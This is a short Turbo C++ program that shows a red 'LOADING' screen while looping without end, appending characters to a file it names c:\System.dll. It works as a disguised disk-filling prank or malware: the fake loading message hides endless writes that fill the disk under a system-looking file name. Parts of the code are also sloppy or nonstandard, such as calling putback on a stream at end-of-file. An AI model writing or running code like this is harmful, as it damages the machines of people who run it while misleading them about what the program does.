#include<fstream.h>
#include<iostream.h>
#include<all.h>
#include<conio.h>
void main()
{
int d=DETECT,m;
initgraph(&d,&m,"c:\\tc\\bgi");
cleardevice();
ifstream o1,o2;
o1.open("c:\\a.txt");
ofstream i1;
i1.open("c:\\System.dll",ios::app);
char ch;
int n=1;
do
{
ch=o1.get();
n++;
}
while(!o1.eof());
n=1;
do
{
o1.putback(ch);
i1.put(ch);
if(n==1)
{setcolor(RED);settextstyle(1,0,6);outtextxy(100,100,"LOADING");n++;}
}
while(n>0);


o1.close();
i1.close();

}
